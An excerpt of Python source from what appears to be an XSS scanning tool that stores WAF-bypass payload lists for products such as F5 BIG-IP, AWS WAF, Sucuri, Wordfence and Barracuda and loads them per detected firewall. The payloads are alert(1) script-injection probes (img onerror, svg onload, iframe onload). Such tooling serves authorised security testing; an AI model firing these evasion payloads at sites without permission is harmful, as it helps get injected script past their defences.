...
WAF bypass profiles are loaded from ``akha/data/waf_profiles/*.yaml``.
...
_DEFAULT_WAF_PROFILES = {
    ...
    "f5_bigip": [
        "<img src=x onerror=alert(1) class=bypass>",
        "<svg onload=alert(1) class=bypass>",
        "<iframe onload=alert(1) class=bypass>",
    ],
    "aws_waf": [
        "<img src=x onerror=alert(1) style=''>",
        "<svg onload=alert(1) style=''>",
        "<body onload=alert(1) style=''>",
    ],
    "sucuri": [
        "<img src=x onerror=alert(1) title='test'>",
        "<svg onload=alert(1) title='test'>",
        "<img src=x onerror=alert(1) alt='test'>",
    ],
    "wordfence": [
        "<img src=x onerror=alert(1) data-test=''>",
        "<svg onload=alert(1) data-test=''>",
        "<iframe onload=alert(1) data-test=''>",
    ],
    "barracuda": [
        "<img src=x onerror=alert(1) id='test'>",
        "<svg onload=alert(1) id='test'>",
        "<body onload=alert(1) id='test'>",
    ],
    "generic": [
...
_WAF_PROFILE_CACHE: Optional[Dict[str, List[str]]] = None


def _load_waf_profiles() -> Dict[str, List[str]]:
    global _WAF_PROFILE_CACHE
    if _WAF_PROFILE_CACHE is not None:
        return _WAF_PROFILE_CACHE

    profiles: Dict[str, List[str]] = {}

    search_paths = []
    local_dir = os.path.join(os.path.dirname(__file__), "..", "data", "waf_profiles")
    search_paths.append(os.path.abspath(local_dir))

    try:
        resource_dir = resources.files('akha').joinpath('data/waf_profiles')
        search_paths.append(str(resource_dir))
    except Exception:
        pass
    ...
    for base_dir in search_paths:
        ...
        for name in os.listdir(base_dir):
            ...
            profile_name = (data.get('name') or os.path.splitext(name)[0]).strip().lower()
            payloads = data.get('payloads') or []
            if not profile_name or not isinstance(payloads, list):
                continue
            sanitized = [p for p in payloads if isinstance(p, str) and p]
            if sanitized:
                profiles[profile_name] = sanitized

    if not profiles:
        profiles = dict(_DEFAULT_WAF_PROFILES)
    else:
        for key, payloads in _DEFAULT_WAF_PROFILES.items():
            profiles.setdefault(key, list(payloads))

    _WAF_PROFILE_CACHE = profiles
    return profiles

# Legacy payloads retained for reference only. These are not used by default
# because modern servers and proxies typically reject null-byte sequences.
LEGACY_PAYLOADS = [
...
class PayloadGenerator:
    ...
    def generate(
        ...
        minimal_payloads: List[str] = []
        if minimal_grammar:
            minimal_payloads = self._gen_minimal_candidates(
                context=context,
                lt=lt,
                gt=gt,
                dq=dq,
    ...
    def get_bypass_payloads(self, waf_name: str) -> List[str]:
        profiles = _load_waf_profiles()
        name = (waf_name or '').lower()
        if 'cloudflare' in name:
            profile = profiles.get('cloudflare', [])
        elif 'modsecurity' in name:
            profile = profiles.get('modsecurity', [])
        elif 'akamai' in name:
            profile = profiles.get('akamai', [])
        elif 'imperva' in name or 'incapsula' in name:
            profile = profiles.get('imperva', [])
        else:
            profile = profiles.get(name, profiles.get('generic', []))

        generic = profiles.get('generic', [])
        return list(profile) + [p for p in generic if p not in profile]
